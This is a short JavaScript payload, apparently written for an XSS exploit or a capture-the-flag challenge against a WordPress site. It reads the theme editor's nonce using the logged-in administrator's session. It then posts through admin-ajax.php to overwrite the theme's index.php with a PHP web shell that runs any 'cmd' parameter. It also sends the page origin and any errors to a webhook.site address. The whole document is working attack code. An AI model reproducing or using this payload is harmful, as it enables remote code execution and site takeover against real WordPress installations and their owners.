async function pepe(){
    fetch('https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?'+location.origin);
    var a = await fetch('http://localhost:1024/wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo',{"credentials":"include"}).then(resp=>{return resp.text()}).then(text => {return text.match(/name="nonce" value="([0-9a-f]{10})/)});
    console.log(a);//try with a different file 
    return a;
}

try{
var a = await pepe();

fetch("http://localhost:1024/wp-admin/admin-ajax.php", {
    "headers":{"Content-type":"application/x-www-form-urlencoded"},
"body": `nonce=${a[1]}&file=index.php&theme=twentytwentytwo&newcontent=<?php  if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}
?>&action=edit-theme-plugin-file&file=index.php&theme=twentytwentytwo`,
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
}catch(err){
    fetch('https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?'+err);
}
